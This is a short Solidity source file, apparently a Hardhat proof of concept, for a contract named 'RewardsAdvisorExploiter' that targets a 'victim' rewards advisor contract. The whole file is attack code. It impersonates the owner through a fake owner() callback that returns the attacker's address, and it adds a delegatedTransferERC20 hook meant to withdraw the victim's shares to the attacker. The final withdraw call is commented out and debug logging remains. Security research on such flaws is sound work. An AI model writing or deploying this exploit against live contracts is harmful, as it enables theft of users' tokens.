// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// pull interface from contract

interface IAdvisor {
    function owner() external returns (address);
    function withdraw(
        uint256 shares,
        address to,
        address from
    ) external returns (uint256 rewards);
    function delegatedTransferERC20(
        address token,
        address to,
        uint256 amount
    ) external;
}

contract RewardsAdvisorExploiter {
    address victim;
    address pwner;
    IERC20 gtoken;

    //setup
    constructor(address _victim, address _token) {
        pwner = msg.sender;
        victim = _victim;
        gtoken = IERC20(_token);
    }

    function owner() external view returns (address) {
        console.log('Owner Checked');
        console.log('Victim', victim);
        console.log('Owner', pwner);
        console.log('Sender', msg.sender);
        return pwner;
    }
    function delegatedTransferERC20(
        address token,
        address to,
        uint256 amount
    ) external {
        console.log("Sender",msg.sender);
        console.log("Token", token);
        // withdraw the shares
        uint256 shares = gtoken.balanceOf(address(this));
        console.log("shares", shares);
        // IAdvisor(victim).withdraw(shares, pwner, address(this));
    }
}
